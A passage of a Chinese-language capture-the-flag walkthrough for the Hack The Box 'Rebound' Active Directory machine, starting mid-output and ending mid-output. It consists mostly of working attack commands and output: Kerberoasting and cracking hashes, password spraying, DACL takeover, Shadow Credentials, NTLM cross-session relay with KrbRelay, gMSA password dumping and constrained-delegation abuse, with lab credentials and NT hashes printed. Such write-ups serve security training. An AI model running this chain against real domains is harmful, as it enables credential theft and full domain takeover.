b38dd42ae74707f9af972bb068562d91ef79d7c335e5fa2b438778b9ab00f297899361591be01b1ebc128b37dff595e8bb1e0f028f9c7632b012d352e81c0b5660c2a6ef0a1a42967b7fae4c1abd09279
$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$676eaed2d439c42a6527e613$edbd46f85fd04d663029ae0f38a60b6c4387f102e74f1c6f7afb3bcf7cfaf403315e95c3d44cfe92ad358163b825a5ec208914a3c57de024598f67a0e22c81cc12503d0d3d5c30d0af43fd829bad743551438c0ba471470f87f1d0d9b0f3679f5579698d805d16042bcf109d7eda65e2f7d11f82fb62fef7e437dc9a9f26ea6043475bab07bdc9f6ddd824550085b1fc4dfa5b8751efabf603c8b435f76c598cc492e0d01915068ea6137ada5233bd8446e81878206f757c1562e71ff7821c546a81117a5b7a0af14092f392d652c480236cc0c88a35dbe34ca858c5150756d6d75035265124659f99e107776d976b7b9cc93d1b6deba493c20e7782ce69f12a344b0559ba2a0db7a2febe7da4daa6d90f36f97250ce16191a758ee264a7c16803baafe2f767724c0f7c87525378ab80f7c63fdcf2ea6b27e1a7b7c774597f56efc798443e280621eb7506b12a54ece0cbca159f301767c76d97503b87c9a448d846901cbff3d2d28377b91a979e5349a591f11f23420853cd328b7446d13c60b1eeb701711fbe10cadbc13c6a35f5eed5de082adc6f2d20a4a7843c777a6709747c13bedaa1f3324bfce2f3593b3190c39afcce51426f8a1eff6c773d0100388505cffb856c083ece4f6331d06d1a57124bf220b639ac2c2dda020fc164845f9e53a529c7e135cdcfca76952b7ea35a463a04087f9af87e0fa025e033d3c986736c44dfa2f380b865e0ff970ad40abe53b9c8f1e166a7feea936fa9ff886217e50f8f8b4a55fc01bf26914c419adec47233c47a9bcf851aaf0c1f9c2e345459fe5ab037d6cbe457ff89e215ff91b8777b5e39422c5a884746e3176711897dae50f7ef0ccb6ff68ee602bf12902a2fb498f5e83196f9e1f9b07670c3264c2cd86161190e74563acd4140f2423b40a7436a0660338613796562de436a7a8445d5bdc5916873da5368749e9562317ff6f11e984b785a6dd96033270955599b0cd07cd6056a8ae4ae2a77402066306feed7280f063e7917df669a6abad3dec14ad87251a1145a6c3b3db3d4eb9e889846bc3a8daa27eac9dd0c144f90de20b6c258f47321bf7505bc290d0d4d719ff2438fd3b123dcaaa2be8f57e8d0596a11cc0b4f0e91c2950daf39a4cf712f40f23c9506cee7000b8a3ed18002d79b0abe23c26e3a4ac586f5a9f075f8e7ea41e8d0f3c51aae863c6ecdcbb46442f8283d8c8e9e30dbb975024b1ccf485fa537e970945f9600230b7cc794cdd395efa6c2ebd270f8a60af6aaa4a1c6403dd42286ea15a3d80b7e810628cdb8f75783fecc0493218fc934ae89f0687cac4e09982d8e5716a30c05e67986892448f2528d3dd6291c282e82db4a131924e6
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$20941b976672bf739ab097ba01a8cfae$3a4367ed51eb98246925df381ddaf352c124bead33075606510e7a0a879a6a76ec2bdafc4cc5db9427d4ff5985a646b0bd20f666ab3e174dde613f4a9edd67c3d50631955fc2eb3fd69750a1c4da1642c9100bb187ab841ebe4766366462dd0fea6c8e05b14e862360ee97cd7637f3264ff4f3415eb353431cf8d8aed45afec6a3aaacf1e39dce01ef657213a50da924deca54853452d861fbc108ee0e49ecda8d698941b0d7151b3800149ef9937b668a9e76af6274f5e8c172dddfc916c53dd6e520b7e0edf95ab20729ad7f85ffeb218664f8dfd03a9c5addc226d3aba6ef054d2029c73c39cc3ca0fc895b329a9db84f699ef31b4fed7843749370971bbacc5f829b3721d16d182370ebcb728953d538cca54f908e0d5eb918eaeff7f2e2ee0b770736ccfb9aad2f725374c9057c9b8cb61d6cd262a93d997e1de62fe5c4a6b5c2bf80dd1bc8e4f82725516ab85a78d98fb87fcb7f78d61602f43f9b53c7463d7158d37f482c02178ef798b3b1badb4ae89e95f10363e82b373dd7d108f71c67768ce64a48388023190d0f7e6696946ad17ad5c3f3858081956f4ceae07da4fd80ccf6ef3b611a76fd51cf487fd3125f6c5e8ba9bc9c07f5fa1c1b1118af320d63425fdc28131b61bf1a5a6bc44b99506da168037a00dea3012d23818e1bf91cbe5bf6f4bae50d243d9a1b71a8de4cdace5c6b9557fb1c732b24507c41d1270f15e604fe7d4ca35b362e09bb75f41a8c070d9bc226e19ce50fa03e30f0907e43da8b063d0400fbb73494e010e7458a3d17e1b8cdd71e10d375a739bc47ef68234068caefafb4d932d755cef4f0c15a0883f35655fb552bb8157c54ab991773e6f349239abd8b0465e6a1c3710e34053b83a5e678b6c151162e1898f602579c85493a4561118e13b54245a8f11ac0e4e1515c8e49c3cf808fe3909b82d85b9ed08adf8fd8d7cdbcdd8419df7db382fb83c1b60ac147911cc1e36ec25daa024afa64d4b0b494271750157fc95cbb39bfa0d9f8f82bd2ca72a5b532b93423ed4e18548f622d0b58e75b15f474b13a167fe18a599dd2b85d0089598652b90d7143ed144dc87debf95ed91e9230ec9762649e1b684a3a2933eafc6e05cfa9c1c0beb61cbe0669bcc148dcc484a7b1f07c83c18203360efdc059f81dff14fcc5fea703f9eaaa51a1e7dec1e363d943c14965d14e76928f98c44e4882ecb4f990a6579e9fd031c50df44bc79fd68d79047c94f9eb8e6ccc1c77816d30ee6102309719e376309ad74ed19ca621e686a33277377b71e36d5d2e4163b352c846b5208f7ea97d2fa1f59b5ebbccc4b044c8b3f22b59192040530931ccc63c1607c1c35e04c0
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$6cab342633ff628cfcfac8c4$71fd68ad65f56c75f181aa22d1e803a739ff8f633f1096e1c59ac72c0cdaff8432bace2027c335b971a24d5f417ee30075f2996b2ae2e48698f9b30c9ba04891cb3ecffaba2f57aad6f6cee7a53aac3c301a6ba5689bae2c54a9ccc7f58d670ecebcac2234d0d22e5cfb48d4adc534fde9822464b980ee548ec9fecd7a42a225679fd2ec52bab1b0af038e2844489f2d2925e1b46dffed03e72fed1efcd84fb40029c17afec70e279209ca1383c9549bcdc80ab1f4aaa33f7665de2cef404ad8c3922bd1fcdd60371c8f0dbc72c65db6a40837cc6fae06c20a1999689788e67ea1a4cc7ec0ebff158090aeb2a8a2aaa64b3c6cf07c3a5dd84356f0733ae208ca4087f16f92306775f427e2fa11d4df609be59b58112177cba564bff5361f973693274529f5dac04139e8208467364d2b87404dc9cdda9daf3bf31eb53484d5afd414a7e3e4340d307079561b03b6bcce1547f4605ca96b5e1599d5681f2779222465ebae5911e3433208d3bc43240f77a3a757e02a7bdcbcf49d265622f85f2e525f902867665828d53768e169b0185548a7ddb7721541f974730b983fdb9b01ccb04561ac86264479c4e55a21cc51a39e36df0aeaa3cd983ecb453e964bc5b645211b6c0658188696a8ebc909999530b582ae8f3efa44924a86c4d705e473196d4edd1617a641f683cd4a7b8ff5436981d7b39d03a8bf189b238256ea7160f28bdb126a47f0dba95883d7c8f8e8e5acbc5562f8a08aa04ec03064b6bb215065f03028003f60782e5898b00f70086ab2a7718e3d382d8ffc73116b7ff2accba494b67bbbf0b7b0d1022ec0a7a00d78280380d208c8032edfd7d0e2bda779a4b4d513d90ac9c3395516bfd6fabe73ef6804d0a07c1bfe75b1a639fd671246ea4447cbeb392178382fee5321a2db0ce5dfabdb4d35e87c23b3668335a68bcaa9d22c45fedc9bc7b15af986196ff8353f618822e1fce7a07b85c38d20a19602a1b12d4bca45b92c671349073c629154aac7884cd7597ab80ccde050d6c349c280f7a9de6da94404b7600b0a55eefb2b132a093bd7574d367bb79e7bea8263a88882de510cf8d0e534678dddc6ab81dff055f1e56a1944f11a5a8a5b2e9ec20342cd1460544f63f1dbb6698dfd40a746828a8beded8056cb50765bb1dcffe8524536747556e2b3cf977aa32852c6579066383408c3917cc325a34d66f0c5f556d937dd7981485193a999fc669c756f4eb6ba354bac985ceb870e647a14e8afd70b1e52ec011ebb6c0f7b1b9e00e9b2f2548d0245185eedc967073c4f7f7b8ebc5c7775d4f1410e81f8999cfde4af7a61094d25d905b6800c7470d7e2324c01053e62cb20d5b10ac090c76d91
```

该命令成功运行并产生许多票据，包括ldap_monitor和delegator$的票据。做出一个有根据的猜测，DC01、krbtgt和delegate$票证是不可破解的，因此将重点放在ldap_monitor票证上。

将其保存到一个文件中，并将其提供给john:

``` bash
┌─[root@kali] - [~/hackthebox/machine/rebound] - [2556]
└─[$] john hash --show                                                                                                                               [20:59:33]
?:1GR8t@$$4u

1 password hash cracked, 0 left
```

#### Bloodhound & Powerview

使用[bloodhound.py](https://github.com/dirkjanm/BloodHound.py)远程枚举目标AD环境。调整集合查询(-c)以排除ObjectProps，因为它似乎会导致工具失败。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound1.5.png)

***Bloodhound的复杂性超出了本文的范围，但可以在HTB的[Active Directory Bloodhound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound)模块中获得。***

``` bash
bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc dc01.rebound.htb --zip -c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -ns 10.10.11.231
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound1.png)

Bloodhound没有透露太多信息，但是，发现ServiceMgmt在Service Users组织单元(OU)上具有GenericAll，这可能导致[Descendant Object Takeover (DOT)](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll)。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound2.png)

然而，首先，需要找到一种方法来成为组的一部分或妥协组中的用户。
使用[powerview.py](https://github.com/aniqfakhrul/powerview.py)进行进一步的枚举。

这表明LDAP通道绑定设置被设置为"Always"，导致服务器放弃来自不提供令牌的客户端的任何连接。对于想要对LDAP/LDAPS执行的任何查询，也会发生这种情况。

通过-k标志绕过Kerberos身份验证的这个约束。

 - 确保系统时钟与服务器时钟同步，以便Kerberos正常工作:

``` bash
┌─[root@kali] - [~/hackthebox/machine/rebound] - [2557]
└─[$] ntpdate rebound.htb                                                                                                                            [20:59:52]
2024-04-06 04:17:13.7079 (-0500) +25202.758727 +/- 0.127430 rebound.htb 10.10.11.231 s1 no-leap
CLOCK: time stepped by 25202.758727
┌─[root@kali] - [~/hackthebox/machine/rebound] - [2558]
└─[$] powerview rebound.htb/ldap_monitor:'1GR8t@$$4u'@dc01.rebound.htb -k                                                                             [4:17:13]
Logging directory is set to /root/.powerview/logs/rebound.htb-dc01.rebound.htb
(LDAPS)-[dc01.rebound.htb]-[rebound\ldap_monitor]
PV > Get-DomainObjectAcl -Identity Servicemgmt
...
ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : Self
AccessMask                  : 0x8
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
...
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound3.png)

通过Self权限，orend可以将自己添加到组中。虽然目前没有这个用户的任何凭据，但是可以通过netexec喷射ldap_monitor的密码，希望能找到匹配的。

``` bash
pipx install git+https://github.com/Pennyw0rth/NetExec

λ ~/hackthebox/machine/rebound/ netexec smb dc01.rebound.htb -u usernames.txt -p '1GR8t@$$4u' --continue-on-success
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u
SMB         10.10.11.231    445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u
SMB         10.10.11.231    445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         10.10.11.231    445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE
```

找到了oorend用户，这意味着现在可以将自己添加到组中。

回到powerview，这次是oorend。

``` bash
┌─[root@kali] - [~/hackthebox/machine/rebound] - [2559]
└─[$] powerview rebound.htb/oorend:'1GR8t@$$4u'@dc01.rebound.htb -k                                                                                   [4:24:53]
Logging directory is set to /root/.powerview/logs/rebound.htb-dc01.rebound.htb
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > Add-DomainGroupMember -Identity servicemgmt -Members oorend
[2024-04-06 04:25:11] User oorend successfully added to servicemgmt
```

#### Descendant Object Takeover

将自己添加到ServiceMgmt之后，现在在服务用户OU上拥有了GenericAll(也称为FullControl)。这允许将FullControl特权扩展到属于该OU的每个对象。在这种情况下，这些对象是winrm_svc和batch_runner:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound4.png)

为了执行攻击，使用dacledit.py，它也被打包到之前安装的[Impacket的分支](https://github.com/ThePorgs/impacket.git)中。

使用-inheritance标志，重写并扩展了当前的特权到子对象:

``` bash
(impacket-fork) [root@kali ~ ]$ dacledit.py rebound.htb/oorend:'1GR8t@$$4u' -k -dc-ip 10.10.11.231 -action write -rights FullControl -inheritance -principal oorend -target-dn "OU=Service Users,DC=rebound,DC=htb" -use-ldaps
/root/impacket-fork/bin/dacledit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.10.1.dev1+20231106.134307.9aa93730', 'dacledit.py')
Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs

[-] CCache file is not found. Skipping...
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20240406-043124.bak
[*] DACL modified successfully!
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound5.png)

 - 注意: 如果在这个阶段出现INSUFF_ACCESS_RIGHTS错误，请确保将oorend重新添加到ServiceMgmt组，因为该bxo的清理任务可能已经重置。

检查winrm_svc或batch_runner对powerview的权限，看到oorend现在对两个对象都有FullControl (GenericAll):

``` bash
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > Get-ObjectAcl -Identity winrm_svc -Where "SecurityIdentifier contains oorend"
ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
```

使用FullControl权限，然后对winrm_svc执行[ShadowCredentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)攻击，因为这个名称暗示可能能够使用该帐户来恶意winrm连接到box中。

``` bash
λ ~/hackthebox/machine/rebound/ certipy-ad shadow auto -u oorend@rebound.htb -p '1GR8t@$$4u' -account winrm_svc -target dc01.rebound.htb -dc-ip 10.10.11.231 -k
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9f14b32c-1290-2a13-ef11-ae83e76fe810'
[*] Adding Key Credential with device ID '9f14b32c-1290-2a13-ef11-ae83e76fe810' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '9f14b32c-1290-2a13-ef11-ae83e76fe810' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@rebound.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound6.png)

检索到NT hash后，可以使用它来恶意入侵box。

``` bash
evil-winrm -i dc01.rebound.htb -u winrm_svc -H 4469650fd892e98933b4536d2e86e512
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound7.png)

#### cross-session relay

检查系统上运行的进程可以发现在session 1中运行的许多任务，这表明可能有另一个用户登录到该box中。

``` bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ps
Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName
------- ------ ----- ----- ------ -- -- -----------
385 32 12032 20824 2576 0 certsrv
462 18 2348 5588 392 0 csrss
267 16 1968 5168 516 1 csrss
361 15 3440 14940 5164 1 ctfmon
400 33 16388 25152 2652 0 dfsrs
158 8 1944 6356 2784 0 dfssvc
285 14 3992 13876 3756 0 dllhost
```

系统上经过身份验证的用户可以打开目标以进行cross-session攻击。为这个任务上传工具包，包括[KrbRelay](https://github.com/cube0x0/KrbRelay)和[RunasCs](https://github.com/antonioCoco/RunasCs)。

***虽然RunasCs在其Github版本中有预编译的可执行文件，但KrbRelay没有。该项目必须下载并在Windows机器上编译，这超出了本文的范围。确保使用最新版本，其中包括NTLM cross-session支持。***

使用RunAs，可以通过运行qwinsta来验证是否有人登录:

``` bash
.\RunasCs.exe oorend '1GR8t@$$4u' -l 9 "qwinsta"

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```

使用runa和KrbRelay的组合，可以强制来自tbrady的连接，这将生成hash。

为此，通过-ntlm指定NTLM身份验证，通过-session指定session号，并为具有正确权限的有效RPC服务指定CLSID，从README上列出的[默认值](https://github.com/cube0x0/KrbRelay#clsids)中选择(在Cross-Session Relay下，适用于Windows Server 2019)。

``` bash
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./RunasCs.exe oorend '1GR8t@$$4u' -
l 9 "c:\users\winrm_svc\documents\KrbRelay.exe -ntlm -session 1 -clsid 354ff91b-
5e49-4bdc-a8e6-1cb6c6877182 -port 10246"
[*] Auth Context: rebound\tbrady
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: c:\users\winrm_svc\documents\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADb8QujUWpk7EXlFOjCHVuIAigAAGwb//87FS6QsIPIYCIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing cross-session authentication
[*] Using CLSID: 354ff91b-5e49-4bdc-a8e6-1cb6c6877182
[*] Spawning in session 1
[*] NTLM1
4e544c4d535350000100000097b208e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44
[*] NTLM2
4e544c4d53535000020000000e000e003800000015c289e25976b5afd38af057000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800b4a468ea5e87da010000000000000000000000005c00410070007000490044005c004b00507044400b7f0000
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons
[*] NTLM3
tbrady::rebound:5976b5afd38af057:781d933ebf471ba3a53f8fde38534ba5:0101000000000000b4a468ea5e87da01403a32a0d7d14b060000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800b4a468ea5e87da0106000400060000000800300030000000000000000100000000200000324a7a4dc5cc35f66c25982fee19d22fd89b784aed0a551a1d262bb80a1919680a00100000000000000000000000000000000000090000000000000000000000
System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
   at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults)
   at KrbRelay.Program.Main(String[] args)
```

虽然最终得到了一个错误，但获得了thbrady的NTLM3 hash，将其保存到一个文件中并提供给john。

``` bash
john tbrady --wordlist=/usr/share/wordlists/rockyou.txt

543BOMBOMBUNmanda (tbrady)
```

通过枚举tbrady的权限，看到他在delegate$上拥有ReadGMSAPassword

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound8.png)

组管理服务帐户(GMSA)涉及一种设置，其中Windows服务器通过为帐户创建复杂的随机密码来自主处理该帐户的密码。可以通过过滤delegate$的msDS-ManagedPassword属性来使用[bloodyAD](https://github.com/CravateRouge/bloodyAD)dump它。

``` bash
[root@kali:~/bloodyAD on main]
# python bloodyAD.py -d rebound.htb -u tbrady -p '543BOMBOMBUNmanda' --host dc01.rebound.htb get object 'delegator$' --resolve-sd --attr msDS-ManagedPassword

distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:43e9069a73081ecfcbe1514e1d4e3bc8
msDS-ManagedPassword.B64ENCODED: tstzpYhnwwC1LuLjL0MtLrXzhLdDe8HPWCmR5BxwR5Gg87pPdmKYlhqMUh7njfqjzauLXDCp0Ofk7V+yfqCu0f5t+5zS/SmOw5wdqERpgl/uyd6LdKk/ZJYHAhifOVFWl4svHJ787reCRKbS+44rzi1DM4CcY/LLKAzHevGe3NkHww8vILZUU6cQNcKSyteGPRmxK2iq05EUs8ggGBwxAHwXCm24U8gdc19ILeL8YTtbUy/n5t+t7/DScrDHK8O1Suo6yPJXP37UaDsbIWJiqGNgcSLyWPgT6hEhLkODEjsBiqAgDAYTkrR6YZ1jlQGr6bSd9o70rSN6lPoRlfkDyQ==
[root@kali:~/bloodyAD on main]
# netexec ldap rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa
SMB         rebound.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        rebound.htb     636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda
LDAP        rebound.htb     636    DC01             [*] Getting GMSA Passwords
LDAP        rebound.htb     636    DC01             Account: delegator$           NTLM: 43e9069a73081ecfcbe1514e1d4e3bc8
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound9.png)

delegator$'s hash: 43e9069a73081ecfcbe1514e1d4e3bc8

#### Constrained Delegation (KCD) Abuse

攻击者可以利用Kerberos委托获得对重要资源的访问权，在某些情况下，甚至可以将其权限提升到域管理员的权限。两种特定形式的委托，约束委托和基于资源的约束委托(RBCD)，都使用称为[Service-for-User (S4U)](https://www.thehacker.recipes/a-d/movement/kerberos#service-for-user-extensions)的Kerberos扩展

虽然Bloodhound没有显示约束委托，但findDelegation.py显示delegator$实际上能够委托:

``` bash
findDelegation.py rebound.htb/oorend:'1GR8t@$$4u' -dc-ip dc01.rebound.htb -k

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType                       DelegationRightsTo
-----------  -----------------------------------  -----------------------------------  ---------------------
DC01$        Computer                             Unconstrained                        N/A
delegator$   ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb
```

 - 注意: 再一次，使用了之前安装的Impacket的ThePorgs分支。

没有protocol transition的委托意味着不可能用经典的"getST"来滥用它。尝试这样做会导致Kerberos错误:

``` bash
getST.py rebound.htb/delegator\$ -hashes :43e9069a73081ecfcbe1514e1d4e3bc8 -dc-ip dc01.rebound.htb -spn http/dc01.rebound.htb -impersonate Administrator
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable
```

这是因为缺乏Protocol Transition，这意味着S4U2Self步骤不会产生可转发的票证，从而导致S4U2proxy步骤失败。

本质上，用户对自己的服务(S4U2self)协议使服务能够代表另一个用户请求服务票证，但用于自己的使用。相反，用户到代理服务(S4U2proxy)协议允许一个服务代表另一个用户请求服务票证，但是请求的是不同的服务。

可以通过执行S4U2Self并检查生成的票据来验证这一点。首先通过-self标志请求票证:

``` bash
getST.py rebound.htb/delegator\$ -hashes :43e9069a73081ecfcbe1514e1d4e3bc8 -dc-ip dc01.rebound.htb -spn http/dc01.rebound.htb -impersonate Administrator -self
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] When doing S4U2self only, argument -spn is ignored
[*] Requesting S4U2self
[*] Saving ticket in Administrator@delegator$@REBOUND.HTB.ccache
```

如果检查票证，看到可转发flag没有设置:

``` bash
describeTicket.py Administrator@delegator\$@REBOUND.HTB.ccache
[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 997cb2bd199848c134a230582eed4046
[*] User Name                     : Administrator
[*] User Realm                    : rebound.htb
[*] Service Name                  : delegator$
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 05/04/2024 09:28:48 AM
[*] End Time                      : 05/04/2024 19:28:48 PM
[*] RenewTill                     : 06/04/2024 09:28:46 AM
[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : mXyyvRmYSME0ojBYLu1ARg==
[*] Kerberoast hash               : 